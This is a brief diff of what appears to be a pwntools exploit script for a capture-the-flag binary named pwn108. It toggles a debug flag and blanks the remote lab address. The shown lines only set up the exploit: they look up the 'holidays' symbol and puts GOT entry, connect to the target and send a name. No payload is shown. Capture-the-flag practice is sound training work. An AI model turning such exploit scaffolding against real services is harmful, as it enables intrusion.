@@ -5,11 +5,11 @@ context.binary = e.path
 holidays = e.symbols['holidays']
 puts_got = e.got['puts']
 
-DEBUG = 1
+DEBUG = 0
 if DEBUG == 0 :
     p = process("./pwn108")
 else : 
-    p = remote("10.10.253.250", 9008)
+    p = remote("", 9008)
 
 p.recvuntil(b"=[Your name]:")
 p.sendline(b"Zayd")
